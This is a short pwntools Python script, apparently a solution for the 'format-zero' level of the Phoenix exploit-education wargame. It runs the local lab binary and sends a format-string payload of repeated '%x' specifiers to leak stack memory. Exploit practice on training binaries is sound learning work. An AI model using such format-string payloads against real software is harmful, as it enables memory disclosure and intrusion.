#!/usr/bin/env python3
from pwn import *

path = "/opt/phoenix/amd64/format-zero"
context.binary = path

io = process(path)
print(io.recvline().decode("ascii"))
io.sendline("%x" * 9)
print(io.recvline().decode("ascii"))
